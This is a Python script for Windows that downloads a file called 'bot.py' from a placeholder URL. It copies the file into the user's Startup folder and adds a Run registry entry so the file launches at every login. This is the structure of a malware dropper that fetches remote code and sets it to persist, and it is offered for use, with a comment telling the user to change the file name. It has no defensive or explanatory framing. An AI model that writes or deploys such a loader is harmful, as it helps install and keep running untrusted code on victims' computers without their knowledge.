import os
import shutil
import winreg as reg
import requests



# In line 47, change the variable's value from "bot.py" to the required name




def add_to_startup(target_file):
    # Get the current script's path
    script_path = os.path.abspath(__file__)

    # Get the target file's path in the same folder
    target_file_path = os.path.join(os.path.dirname(script_path), target_file)

    # Check if the target file exists
    if not os.path.isfile(target_file_path):
        print(f"Error: Target file '{target_file}' not found in the same folder.")
        return

    # Get the user's startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Copy the target file to the startup folder
    shutil.copy(target_file_path, startup_folder)

    # Add a registry entry for the target file
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = f"Startup_{os.path.splitext(target_file)[0]}"
    value_data = target_file_path

    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, value_data)
        reg.CloseKey(reg_key)
        print(f"File '{target_file}' added to startup successfully.")
    except Exception as e:
        print(f"Error adding file '{target_file}' to startup: {e}")

if __name__ == "__main__":
    # Specify the target file to be added to startup
    r = requests.get("url", allow_redirects=True)
    open("bot.py", 'wb').write(r.content)
    target_file_name = "bot.py"       # Change this value to file name
    add_to_startup(target_file_name)
